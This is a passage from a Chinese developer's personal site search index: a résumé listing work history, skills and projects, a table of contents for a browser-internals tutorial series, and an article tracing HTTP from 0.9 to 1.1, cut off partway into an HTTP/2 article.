data-url=\"bWFpbHRvOiYjeDM4OyYjeDQwOyYjeDYyOyYjOTc7JiN4NzQ7JiMxMjE7JiMxMTI7JiMxMDE7JiM0NjsmIzk5OyYjeDZmOyYjeDZkOw==\">8@batype.com<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li>专 业：计算机科学与技术                    岗 位：研发工程师</li>\n</ul>\n<hr>\n<h4 id=\"工作及教育经历\"><a href=\"#工作及教育经历\" class=\"headerlink\" title=\"工作及教育经历\"></a>工作及教育经历</h4><ul>\n<li>博彦科技：前端开发⼯程师 \t\t\t\t\t           2021.08.16 ~ 至今</li>\n<li>神玥软件：软件开发⼯程师部⻔技术负责⼈\t             2019.07.03 ~  2021.08.13</li>\n<li> 安康学院 \t\t\t\t\t \t\t\t\t\t           2015.09.01 ~ 2019.06.24</li>\n</ul>\n<hr>\n<h4 id=\"专业技能\"><a href=\"#专业技能\" class=\"headerlink\" title=\"专业技能\"></a>专业技能</h4><ul>\n<li>熟练使用：React、VUE、JavaScript、HTML、CSS、TypeScript、Java</li>\n<li> 了解：React 源码</li>\n<li>前端框架：Taro-UI、JQuery、Echarts、Antd、ThreeJS</li>\n<li> 前端服务层：Mobx、Redux</li>\n<li> 前端请求服务：Axios、Ajax、fetch</li>\n<li> 前端资源加载 / 打包⼯具：Webpack 、UmiJS、Vite</li>\n<li> 后端微服务框架：SpringBoot</li>\n<li> 后端服务框架：SpringMVC、Struct2</li>\n<li> 后端 Jdbc 层：MyBatis、Hibernate</li>\n<li> 框架：Django、Pillow、requests、urllib3、bs4、Selemiun、lxml</li>\n<li> 数据库：MySQL、Oracle、Redis、SqLite、memcache</li>\n<li> 服务器：Tomcat、Nginx</li>\n<li> 算法：快速排序、深度优先策略、贪心算法</li>\n</ul>\n<hr>\n<h4 id=\"项目经历\"><a href=\"#项目经历\" class=\"headerlink\" title=\"项目经历\"></a>项目经历</h4><ol>\n<li><p>阿里云开放平台</p>\n<ul>\n<li><p>时间： 2021 年 9 月至今</p>\n</li>\n<li><p>职责：主要负责项目开发、框架服务维护、自动化部署、处理程序紧急问题等职责</p>\n</li>\n<li><p>职位：前端开发工程师</p>\n</li>\n<li><p>内容：在项目期间负责前端页面设计、开发、维护等。主要通过该项目对自己的个人技能有了一个较强的提升，对于自己的知识面有了一个更高层次的认知，使用第三方工具进行快速开发，采用 React  技术栈和其周边工具开发，项目架构采用 umiJs + vite  协同开发模式。</p>\n</li>\n<li><p>业绩：</p>\n<ol>\n<li>每一季度，评分基本都在 A 以上；</li>\n<li>目前通过自己的努力在项目中，担任 TL 职位，负责项目的任务分配，疑难问题处理。</li>\n<li>获得了博彦技术之星称号。</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p>神玥软件 - ⼴东动态监管平台 - 2020 年 6 ⽉⾄ 2021 年 7 ⽉</p>\n<ul>\n<li><p>职 责：主要负责项⽬的开发、开发技术⽀持、框架服务、部署、处理程序紧急问题等职责</p>\n</li>\n<li><p>内 容：在该项⽬中同样采⽤全后端分离架构，该项⽬中不同之处在于使⽤架构发⽣改变，增加使⽤接⼝获取数据、动态切换数据源等。</p>\n</li>\n<li><p>项⽬架构：</p>\n<p>前端 + 展示服务后台 + 数据抓取服务端 + 定时器数据处理服务端 + 接⼝获取数据端 + 第三⽅数据获取服务端组成。</p>\n<p>在前端开发中，项⽬使⽤ 4 层架构进程⻚⾯处理，临时数据存储使⽤ session 进⾏，使⽤有效⻚⾯数据传输保证⻚⾯独⽴性、依赖性降低、项⽬可扩展性增加、便与开发进⾏。</p>\n<p>在定时器数据处理服务端不同之处，在于其需要兼容多中不同数据源，主要包 oracle、db2 (及其 as400 版本)、MySQL 等，兼容其不同语法进⾏处理，连接⼯具类处理，初始化连接等问题，后台数据报⽂传输使⽤某某加密⽅式实现。</p>\n<p>第三⽅接⼝程序实现主要是提供于第三⽅进⾏对接数据，汇总返回数据，进⾏数据统计，完成展示。</p>\n</li>\n<li><p>技 术：React、antd、Spring、SpringBoot、mybatis、SpringSecurity、oauth2、Sqlite、MySQL、redis 等。</p>\n</li>\n</ul>\n</li>\n<li><p>神玥软件 - 公积⾦监督管理云平台 - 2019 年 8 ⽉⾄ 2020 年 5 ⽉</p>\n<ul>\n<li><p>职 责：主要负责项⽬的开发、开发技术⽀持、框架服务、部署、处理程序紧急问题等职责</p>\n</li>\n<li><p>内 容：在公积⾦监督管理云平台开发中，使⽤前后端分离架构。</p>\n</li>\n<li><p>项⽬架构： 前端 + 展示服务后台 + 数据抓取服务端 + 定时器数据处理服务端组成。在前端开发中，使⽤ React 开发框架辅助 antd、amap、echarts、mobx、Axios 等，借助 webpack 打包压缩⽂件等技术实现前端开发任务。</p>\n<p>在后端技术⽀撑⽅⾯使⽤ SpringBoot 微服务框架，进⾏数据展示层⾯服务服务端程序编写。</p>\n<p>在数据获取⽅⾯，数据均来⾃于各现场数据库，编写定时器服务端程序，使⽤频率为 5 分钟到 1 ⼩时不等等⽅法策略实现，适⽤于各种不同的核⼼版本库，通过 sqlite 轻量级数据库进⾏数据暂存，等待公司客户端服务器抓取数据，该技术由于公司限制使⽤该⽅法策略实现，在程序实现⽅⾯使⽤ mybatis 解析 SQL ⽅式编写，xml 配置⽂件进⾏ SQL 配置，通过 dao4j 进⾏ xml 解析获取对应 sql，使⽤ XMLScriptBuilder 进⾏获取 SQL 处理⽣成 sqlSource 资源，根据 sqlSource 获取 boundSql 对象获取编译后带有占位符资源对象，获取占位符信息数据，替换对应参数完成可执⾏ sql。</p>\n<p>在数据抓取客户端使⽤ 5 分钟频率去更新数据，实时抓取数据与数据可进⾏⽐较并且进⾏更新。</p>\n<p>对接使⽤微型前端服务框架，加载第三⽅服务程序。</p>\n</li>\n<li><p>技 术：React、antd、Spring、SpringBoot、mybatis、Sqlite、MySQL、redis 等。</p>\n</li>\n</ul>\n</li>\n<li><p>个人项目 - 微信⼩程序 API + 停⻋场客户端编写 - 2018 年 11 ⽉⾄ - 2019 年 1 ⽉</p>\n<ul>\n<li>职 责：项⽬设计、需求、开发、部署等</li>\n<li>内 容：该项⽬主要使⽤微信⼩程序、Django 框架、H5 前端完成。后端基于 Django 框架，主要是在 Django 框架中进⾏ setting.py 配置，url 编写，数据库模型创建、映射⽂件，view 视图编写，服务代码编写。Api 返回数据序列化处理、json 数据处理。进⾏停⻋场实时数据监控数据处理。并且使⽤ window 2008 server R2 进⾏环境部署，服务器搭建使⽤ nginx+fastCGI+Django 进⾏配置，使⽤ https 进⾏数据访问。</li>\n<li>职 责：负责编写 model、admin、view、API 编写、⽀付接⼝编写；</li>\n<li>开发⼯具、语⾔及框架：JetBrains PyCharm、MySQL、Dreamweaver、Photoshop、Python、Django、HTML、CSS、JavaScript、Ajax、jQuery、Bootstrap 以及 Python 开源框架。</li>\n</ul>\n</li>\n<li><p>个人项目 - 爬取 wikipedia 深度为 3 的超链接</p>\n<ul>\n<li>内 容：Wikipedia 深度为 3 的所有 URL 资源链接的获取（1000 万条记录），采取进程的⽅法进⾏访问 Wikipedia，根据深度优先策略进⾏ URL 第⼆层资源遍历获取第三层 URL 资源。在数据处理过程中，使⽤ request2 技术获取源码、解析拦截⽆⽤⽂件，使⽤ lxml 技术进⾏分离出需要数据，并且检测出可⽤链接， 后进⾏ URL 保存到本地资源。</li>\n<li>难 点：在获取 Wikipedia 网站数据的时候需要处理反爬虫、过滤网站数据、获取需要的资源进行解析。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h4 id=\"获奖经历\"><a href=\"#获奖经历\" class=\"headerlink\" title=\"获奖经历\"></a>获奖经历</h4><ul>\n<li>博彦科技 - 技术之星</li>\n<li>信息安全一级证书</li>\n</ul>\n<hr>\n<h4 id=\"技术博客\"><a href=\"#技术博客\" class=\"headerlink\" title=\"技术博客\"></a>技术博客</h4><ul>\n<li><a href=\"https://note.batype.com/\">https://note.batype.com/</a></li>\n</ul>\n<h4 id=\"⾃我评价\"><a href=\"#⾃我评价\" class=\"headerlink\" title=\"⾃我评价\"></a>⾃我评价</h4><ul>\n<li>爱 好：骑⾏、登⼭、旅游、⽻⽑球、篮球、乒乓球。</li>\n<li>评 价：在我的从事计算机⾏业学习到⼯作也有 6 年之久，从刚开始对计算机的感兴趣到现在的⼯作，以及它成为了我⽣活不可或缺的⼀部分，都是⼀个变化和不多学习的过程，在这个过程中，经历了太多太多的苦难，从刚开始的⼀窍不通到现在的应⽤⾃如以及更深层次的了解，都是在不断⾃学中成⻓起来。需要这般⾃学就必须要有⾃学的动⼒和持之以恒的坚持都是不可缺少的。学习过程中不断的纠正⾃⼰学的⽅向，处理存在的问题以及快速处理问题的解决⽅法，都是⼀个能⼒的提升。 后还有就是对这个⾏业的热爱。</li>\n</ul>\n"},{"title":"浏览器原理","url":"/browser/index.html","content":"<p>学习流程</p>\n<h2 id=\"v8引擎\"><a href=\"#v8引擎\" class=\"headerlink\" title=\"v8引擎\"></a>v8 引擎</h2><p><a href=\"/browser/v8/StackAndHeap.html\">01. 栈空间和堆空间</a><br><a href=\"/browser/v8/GarbageCollection.html\">02. 垃圾回收</a><br><a href=\"/browser/v8/CompilerInterpreter.html\">03. 编译器和解释器</a><br><a href=\"/browser/v8/ScavengeAlgorithm.html\">04. Scavenge 算法</a><br><a href=\"/browser/v8/MarkSweep.html\">05. Mark-Sweep 算法</a><br><a href=\"/browser/v8/MarkCompact.html\">06. Mark-Compact 算法</a><br><a href=\"/browser/v8/IncrementalMarking.html\">07. Incremental Marking 算法</a></p>\n<h2 id=\"浏览器中的页面循环系统\"><a href=\"#浏览器中的页面循环系统\" class=\"headerlink\" title=\"浏览器中的页面循环系统\"></a>浏览器中的页面循环系统</h2><p><a href=\"/browser/pageEventLoop/MessageQueuesAndEventLoop.html\">01. 消息队列和事件循环：页面是怎么 “活” 起来的？</a><br><a href=\"/browser/pageEventLoop/setTimeout.html\">02. WebAPI：setTimeout 是如何实现的？</a><br><a href=\"/browser/pageEventLoop/requestAnimationFrame.html\">03. WebAPI：requestAnimationFrame 的工作机制</a><br><a href=\"/browser/pageEventLoop/XMLHttpRequest.html\">04. WebAPI：XMLHttpRequest 是如何实现的？</a><br><a href=\"/browser/pageEventLoop/MacroAndMicroTasks.html\">05. 宏任务和微任务：不是所有任务都是一个待遇</a><br><a href=\"/browser/pageEventLoop/PromiseXFetch.html\">06. Promise：使用 Promise，告别回调函数</a><br><a href=\"/browser/pageEventLoop/AsyncAwait.html\">07. async/await：使用同步的方式去写异步代码</a><br><a href=\"/browser/pageEventLoop/TaskSchedule.html\">08. 任务调度：有了 setTimeOut，为什么还要使用 rAF？</a></p>\n<h2 id=\"浏览器中的页面\"><a href=\"#浏览器中的页面\" class=\"headerlink\" title=\"浏览器中的页面\"></a>浏览器中的页面</h2><p><a href=\"/browser/pages/DOMTree.html\">01. DOM 树：JavaScript 是如何影响 DOM 树构建的</a><br><a href=\"/browser/pages/RenderPipeline.html\">02. 渲染流水线：CSS 如何影响首次加载时的白屏时间？</a><br><a href=\"/browser/pages/LayeAndSynMecha.html\">03. 分层和合成机制：为什么 CSS 动画比 JavaScript 高效？</a><br><a href=\"/browser/pages/Performance.html\">04. 页面性能：如何系统地优化页面？</a><br><a href=\"/browser/pages/VirtualDOM.html\">05. 虚拟 DOM ：虚拟 DOM 和实际的 DOM 有何不同？</a><br><a href=\"/browser/pages/WebComponent.html\">06. WebComponent：像搭积木一样构建 Web 应用</a><br><a href=\"/browser/pages/PagePerformanceTools.html\">07. 页面性能工具：如何使用 Performance？</a><br><a href=\"/borwser/pages/PerformanceAnalysisTools.html\">08. 性能分析工具：如何分析 Performance 中的 Main 指标？</a></p>\n<h2 id=\"浏览器中的网络\"><a href=\"#浏览器中的网络\" class=\"headerlink\" title=\"浏览器中的网络\"></a>浏览器中的网络</h2><p><a href=\"/browser/http/1.html\">01. HTTP/1：HTTP 性能优化</a><br><a href=\"/browser/http/2.html\">02. HTTP/2：如何提升网络速度？</a><br><a href=\"/browser/http/3.html\">03. HTTP/3：甩掉 TCP、TLS 的包袱，构建高效网络</a></p>\n<h2 id=\"浏览器的安全\"><a href=\"#浏览器的安全\" class=\"headerlink\" title=\"浏览器的安全\"></a>浏览器的安全</h2><p><a href=\"/browser/security/SameOriginPolicy.html\">01. 同源策略：为什么 XMLHttpRequest 不能跨域请求资源？</a><br><a href=\"/browser/security/CorssSiteScripting.html\">02. 跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly 属性？</a><br><a href=\"/browser/security/CrossSiteRequestForgery.html\">03. CSRF 攻击：陌生链接不要随便点</a><br><a href=\"/browser/security/SecuritySandbox.html\">04. 安全沙箱：页面和系统之间的隔离墙</a><br><a href=\"/browser/security/HTTPS.html\">05. HTTPS：让数据传输更安全</a><br><a href=\"/browser/security/HTTPSCA.html\">06. HTTPS: 浏览器如何验证 CA 证有效性？</a></p>\n"},{"title":"categories","url":"/categories/index.html","content":""},{"title":"schedule","url":"/schedule/index.html","content":""},{"title":"Tags","url":"/tags/index.html","content":""},{"title":"HTTP/1：HTTP 性能优化","url":"/browser/http/1.html","content":"<p>谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中最重要且使用最多的协议，是浏览器和服务器之间的通信语言，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP 的最佳途径就是了解其发展史，所以在接下来的三篇文章中，我会从浏览器发展的视角来和你聊聊 HTTP 演进。这三篇分别是即将完成使命的 HTTP/1、正在向我们走来的 HTTP/2，以及未来的 HTTP/3。</p>\n<p>本文主要介绍的是 HTTP/1.1，我们先讲解 HTTP/1.1 的进化史，然后再介绍在进化过程中所遇到的各种瓶颈，以及对应的解决方法。</p>\n<h2 id=\"超文本传输协议HTTP-0-9\"><a href=\"#超文本传输协议HTTP-0-9\" class=\"headerlink\" title=\"超文本传输协议HTTP/0.9\"></a>超文本传输协议 HTTP/0.9</h2><p>首先我们来看看诞生最早的 HTTP/0.9。HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单 —— 用来在网络之间传递 HTML 超文本的内容，所以被称为超文本传输协议。整体来看，它的实现也很简单，采用了基于请求响应的模式，从客户端发出请求，服务器返回数据。</p>\n<p>下面我们就来看看 HTTP/0.9 的一个完整的请求流程（可参考下图）。</p>\n<ul>\n<li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li>\n<li>建立好连接之后，会发送一个 GET 请求行的信息，如 <code>GET /index.html</code> 用来获取 index.html。</li>\n<li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li>\n<li>HTML 文档传输完成后，断开连接。</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d86180ea9cb1403f8ed00.png\" alt=\"HTTP/0.9 请求流程\"></p>\n<p>总的来说，当时的需求很简单，就是用来传输体积很小的 HTML 文件，所以 HTTP/0.9 的实现有以下三个特点。</p>\n<ul>\n<li>只有一个请求行，并没有 HTTP 请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求了。</li>\n<li>服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li>\n<li>返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li>\n</ul>\n<h2 id=\"被浏览器推动的HTTP-1-0\"><a href=\"#被浏览器推动的HTTP-1-0\" class=\"headerlink\" title=\"被浏览器推动的HTTP/1.0\"></a>被浏览器推动的 HTTP/1.0</h2><p>HTTP/0.9 虽然简单，但是已经可以满足当时的需求了。不过变化是这个世界永恒不变的主旋律，1994 年底出现了拨号上网服务，同年网景又推出一款浏览器，从此万维网就不局限于学术交流了，而是进入了高速的发展阶段。随之而来的是万维网联盟（W3C）和 HTTP 工作组（HTTP-WG）的创建，它们致力于 HTML 的发展和 HTTP 的改进。</p>\n<p>万维网的高速发展带来了很多新的需求，而 HTTP/0.9 已经不能适用新兴网络的发展，所以这时就需要一个新的协议来支撑新兴网络，这就是 HTTP/1.0 诞生的原因。不过在详细分析 HTTP/1.0 之前，我们先来分析下新兴网络都带来了哪些新需求。</p>\n<p>首先在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此<strong>支持多种类型的文件下载是 HTTP/1.0 的一个核心诉求</strong>，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件。</p>\n<p><strong>那么该如何实现多种类型文件的下载呢？</strong></p>\n<p>文章开头我们说过，HTTP 是浏览器和服务器之间的通信语言，不过 HTTP/0.9 在建立好连接之后，只会发送类似 <code>GET /index.html</code> 的简单请求命令，并没有其他途径告诉服务器更多的信息，如文件编码、文件类型等。同样，服务器是直接返回数据给浏览器的，也没有其他途径告诉浏览器更多的关于服务器返回的文件信息。</p>\n<p>这种简单的交流型形式无疑不能满足传输多种类型文件的需求，那为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 <code>Key-Value</code> 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d86e30ea9cb1403fa1e4d.png\" alt=\"HTTP/1.0的请求流程\"></p>\n<p>有了请求头和响应头，浏览器和服务器就能进行更加深入的交流了。</p>\n<p><strong>那 HTTP/1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？</strong></p>\n<p>要支持多种类型的文件，我们就需要解决以下几个问题。</p>\n<ul>\n<li>首先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的处理。</li>\n<li>其次，由于万维网所支持的应用变得越来越广，所以单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。</li>\n<li>再次，由于万维网是支持全球范围的，所以需要提供国际化的支持，服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面。</li>\n<li>最后，由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型。</li>\n</ul>\n<p>基于以上问题，HTTP/1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">accept: text/html</span><br><span class=\"line\">accept-encoding: gzip, deflate, br</span><br><span class=\"line\">accept-Charset: ISO-8859-1,utf-8</span><br><span class=\"line\">accept-language: zh-CN,zh</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p>\n<p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">content-encoding: br</span><br><span class=\"line\">content-type: text/html; charset=UTF-8</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p>\n<p>有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP/1.0 支持多文件的一个基本的处理流程。</p>\n<p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性：</p>\n<ul>\n<li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了状态码。状态码是通过响应行的方式来通知浏览器的。</li>\n<li>为了减轻服务器的压力，在 HTTP/1.0 中提供了 <strong>Cache 机制</strong>，用来缓存已经下载过的数据。</li>\n<li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了<strong>用户代理</strong>的字段。</li>\n</ul>\n<h2 id=\"缝缝补补的HTTP-1-1\"><a href=\"#缝缝补补的HTTP-1-1\" class=\"headerlink\" title=\"缝缝补补的HTTP/1.1\"></a>缝缝补补的 HTTP/1.1</h2><p>不过随着技术的继续发展，需求也在不断迭代更新，很快 HTTP/1.0 也不能满足需求了，所以 HTTP/1.1 又在 HTTP/1.0 的基础之上做了大量的更新。接下来我们来看看 HTTP/1.0 遇到了哪些主要的问题，以及 HTTP/1.1 又是如何改进的。</p>\n<h3 id=\"1-改进持久连接\"><a href=\"#1-改进持久连接\" class=\"headerlink\" title=\"1. 改进持久连接\"></a>1. 改进持久连接</h3><p>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d87ca0ea9cb1403fb9beb.png\" alt=\"HTTP/1.0的短连接\"></p>\n<p>在当时，由于通信的文件比较小，而且每个页面的引用也不多，所以这种传输形式没什么大问题。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。</p>\n<p>为了解决这个问题，<strong>HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持</strong>。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d88000ea9cb1403fbcee3.png\" alt=\"HTTP/1.1 的持久连接\"></p>\n<p>从上图可以看出，HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。</p>\n<p>持久连接在 HTTP/1.1 中是默认开启的，所以你不需要专门为了持久连接去 HTTP 请求头设置信息，如果你不想要采用持久连接，可以在 HTTP 请求头中加上 <code>Connection: close</code>。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p>\n<h3 id=\"2-不成熟的HTTP管线化\"><a href=\"#2-不成熟的HTTP管线化\" class=\"headerlink\" title=\"2. 不成熟的HTTP管线化\"></a>2. 不成熟的 HTTP 管线化</h3><p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的队头阻塞的问题。</p>\n<p>HTTP/1.1 中试图通过管线化的技术来解决<strong>队头阻塞</strong>的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p>\n<p>FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。</p>\n<h3 id=\"3-提供虚拟主机的支持\"><a href=\"#3-提供虚拟主机的支持\" class=\"headerlink\" title=\"3. 提供虚拟主机的支持\"></a>3. 提供虚拟主机的支持</h3><p>在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p>\n<p>因此，HTTP/1.1 的请求头中增加了 Host 字段，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p>\n<h3 id=\"4-对动态生成的内容提供了完美支持\"><a href=\"#4-对动态生成的内容提供了完美支持\" class=\"headerlink\" title=\"4.对动态生成的内容提供了完美支持\"></a>4. 对动态生成的内容提供了完美支持</h3><p>在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如 <code>Content-Length: 901</code>，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p>\n<p>HTTP/1.1 通过引入 Chunk transfer 机制来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p>\n<h3 id=\"5-客户端Cookie、安全机制\"><a href=\"#5-客户端Cookie、安全机制\" class=\"headerlink\" title=\"5. 客户端Cookie、安全机制\"></a>5. 客户端 Cookie、安全机制</h3><p>除此之外，HTTP/1.1 还引入了客户端 Cookie 机制和安全机制。其中，Cookie 机制我们在《<a href=\"/browser/protocol/http/flow.html\">HTTP 请求流程：为什么很多站点第二次打开速度会很快？</a>》这篇文章中介绍过了，而安全机制我们会在后面的安全模块中再做介绍，这里就不赘述了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>本文我们重点强调了 HTTP 是浏览器和服务器的通信语言，然后我们从需求演变的角度追溯了 HTTP 的发展史，在诞生之初的 HTTP/0.9 因为需求简单，所以和服务器之间的通信过程也相对简单。</p>\n<p>由于万维网的快速崛起，带来了大量新的需求，其中最核心的一个就是需要支持多种类型的文件下载， 为此 HTTP/1.0 中引入了请求头和响应头。在支持多种类型文件下载的基础之上，HTTP/1.0 还提供了 Cache 机制、用户代理、状态码等一些基础信息。</p>\n<p>但随着技术和需求的发展，人们对文件传输的速度要求越来越高，故又基于 HTTP/1.0 推出了 HTTP/1.1，增加了持久连接方法来提升连接效率，同时还尝试使用管线化技术提升效率（不过由于各种原因，管线化技术最终被各大厂商放弃了）。除此之外， HTTP/1.1 还引入了 Cookie、虚拟主机的支持、对动态内容的支持等特性。</p>\n<p>虽然 HTTP/1.1 在 HTTP/1.0 的基础之上做了大量的优化，但是由于一些效率问题始终很难解决，所以最终还是被 HTTP/2 所取代，这就是我们下一篇文章要介绍的内容了。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的思考题：你认为 HTTP/1.1 还有哪些不足？</p>\n<p>以下是 HTTP/1.1 的一些主要不足：队头阻塞、连接数限制、不支持多路复用、明文传输、缺乏有效的压缩策略、流量控制不足、不支持有效的二进制传输、依赖头部信息、状态码限制、缺乏对服务器推送的支持。</p>\n<p>为了解决这些问题，HTTP/2 被设计并推出，它引入了头部压缩、多路复用、服务器推送等特性，以提高 Web 应用的性能和效率。HTTP/2 旨在成为 HTTP/1.1 的直接替代品，提供更快、更安全、更高效的 Web 体验。</p>\n"},{"title":"HTTP/2：如何提升网络速度？","url":"/browser/http/2.html","content":"<p>上一篇文章我们聊了 HTTP/1.1 的发展史，虽然 HTTP/1.1 已经做了大量的优化，但是依然存在很多性能瓶颈，依然不能满足我们日益变化的新需求，所以就有了我们今天要聊的 HTTP/2。</p>\n<p>本文我们依然从需求的层面来谈，先分析 HTTP/1.1 存在哪些问题，然后再来分析 HTTP/2 是如何解决这些问题的。</p>\n<p>我们知道 HTTP/1.1 为网络效率做了大量的优化，最核心的有如下三种方式：</p>\n<ol>\n<li>增加了持久连接；</li>\n<li>浏览器为每个域名最多同时维护 6 个 TCP 持久连接；</li>\n<li>使用 CDN 的实现域名分片机制。<br>通过这些方式就大大提高了页面的下载速度，你可以通过下图来直观感受下：</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/663d922d0ea9cb14030bea22.png\" alt=\"HTTP/1.1 的资源下载方式\"></p>\n<p>在该图中，引入了 CDN，并同时为每个域名维护 6 个连接，这样就大大减轻了整个资源的下载时间。这里我们可以简单计算下：如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 <code>100 * n * RTT</code>；若通过上面的技术，就可以把整个时间缩短为 <code>100 * n * RTT/(6 * CDN个数)</code>。从这个计算结果来看，我们的页面加载速度变快了不少。</p>\n<h2 id=\"HTTP-1-1-的主要问题\"><a href=\"#HTTP-1-1-的主要问题\" class=\"headerlink\" title=\"HTTP/1.1 的主要问题\"></a>HTTP/1.1 的主要问题</h2><p>虽然 HTTP/1.1 采取了很多优化资源加载速度的策略，也取得了一定的效果，但是 HTTP/1.1 <strong>对带宽的利用率却并不理想</strong>，这也是 HTTP/1.1 的一个核心问题。</p>\n<p><strong>带宽是指每秒最大能发送或者接收的字节数</strong>。我们把每秒能发送的最大字节数称为<strong>上行带宽</strong>，每秒能够接收的最大字节数称为<strong>下行带宽</strong>。</p>\n<p>之所以说 HTTP/1.1 对带宽的利用率不理想，是因为 HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。</p>\n<p>之所以会出现这个问题，主要是由以下三个原因导致的。</p>\n<p><strong>第一个原因，TCP 的慢启动。</strong></p>\n<p>一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 